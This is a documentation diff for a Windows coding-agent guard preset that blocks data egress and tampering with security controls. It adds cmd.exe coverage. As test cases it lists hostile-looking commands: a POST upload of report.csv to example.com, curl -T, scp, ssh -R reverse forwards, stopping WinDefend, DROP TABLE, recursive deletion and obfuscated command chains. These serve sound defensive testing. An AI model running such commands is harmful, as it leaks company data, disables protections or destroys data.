@@ -1,10 +1,13 @@
 # Careful company policy for Windows agents
 
 `careful_company_running_windows` is an opt-in curated preset for Windows
-workstations where a coding agent can run PowerShell without an interactive
-permission prompt. It adds a second boundary alongside dcg's destructive-command
-rules: the agent must not send company data outward or turn off the controls that
-would make that activity visible.
+workstations where a coding agent can run PowerShell or `cmd.exe` without an
+interactive permission prompt. It adds a second boundary alongside dcg's
+destructive-command rules: the agent must not send company data outward or turn
+off the controls that would make that activity visible. Both shells enforce the
+same policy outcomes for statically inspectable commands; dcg interprets their
+different quoting, escaping, control prefixes, nested launchers, and
+command-chaining syntax before applying the preset.
 
 The preset includes six independently selectable policy packs:
 
@@ -12,8 +15,8 @@ The preset includes six independently selectable policy packs:
 |---|---|
 | `careful_company_running_windows.email` | SMTP, Outlook automation, Microsoft Graph mail, transactional mail APIs, and mail-sending CLIs |
 | `careful_company_running_windows.chat` | Slack, Teams, Discord, Telegram, SMS, automation webhooks, and request-catcher services |
-| `careful_company_running_windows.upload` | PowerShell and HTTP file uploads, public file drops, gists, and clipboard egress |
-| `careful_company_running_windows.transfer` | SCP/SFTP/FTP, BITS uploads, remote-sync tools, and cloud-storage uploads |
+| `careful_company_running_windows.upload` | PowerShell, HTTP, and BITS file uploads, public file drops, gists, and clipboard egress |
+| `careful_company_running_windows.transfer` | SCP/SFTP/FTP, remote-sync tools, and cloud-storage uploads |
 | `careful_company_running_windows.tunnel` | Public tunnels, reverse forwards, raw outbound sockets, and DNS data channels |
 | `careful_company_running_windows.guardrails` | Disabling endpoint protection, firewall or audit controls, clearing logs, and tampering with dcg |
 
@@ -52,8 +55,9 @@ disabled = [
 ]
 ```
 
-Disabling the preset ID itself removes all six policy leaves and every pinned
-cross-category member.
+Disabling the preset ID itself removes the members contributed by that preset.
+A leaf that is independently enabled, or a native-Windows pack that is
+default-on, remains enabled through that independent source.
 
 On native Windows, use `%APPDATA%\dcg\config.toml` or have an administrator
 select a centrally managed file before the agent session starts:
@@ -125,8 +129,7 @@ pack treats attempts to disable dcg as security-control tampering.
 
 ## Validate before enforcement
 
-Test representative commands through the same PowerShell hook path the agent
-will use:
+Test representative commands through every shell hook path the agent can use:
 
 ```powershell
 dcg packs --verbose
@@ -135,6 +138,16 @@ dcg test 'Invoke-RestMethod -Method Post -InFile report.csv https://example.com/
 dcg test 'hfdt publish report'
 dcg doctor --json
 ```
+
+For a Cmd-backed hook, submit `tool_name: "cmd.exe"` and verify the equivalent
+policy cases as well, including `blat`, `curl -T`, `scp`, `ssh -R`, `sc stop
+WinDefend`, `snow sql -q "DROP TABLE ..."`, and `rd /s /q`. The release E2E
+suite exercises dcg's Cmd parser path, including caret-obfuscated executables,
+flags and destinations; `if` / `start` / `for ... do`; nested `cmd /c` and
+`call`; and an `hfdt & <egress-command>` chain. That suite submits Cmd-tagged
+hook input to dcg; it does not execute the fixture strings. During release
+validation, separately probe the escape and control-flow assumptions with
+harmless commands on native `cmd.exe`.
 
 Also verify the agent integration itself. dcg can only evaluate commands that
 the host exposes to its hook. In particular, review the current
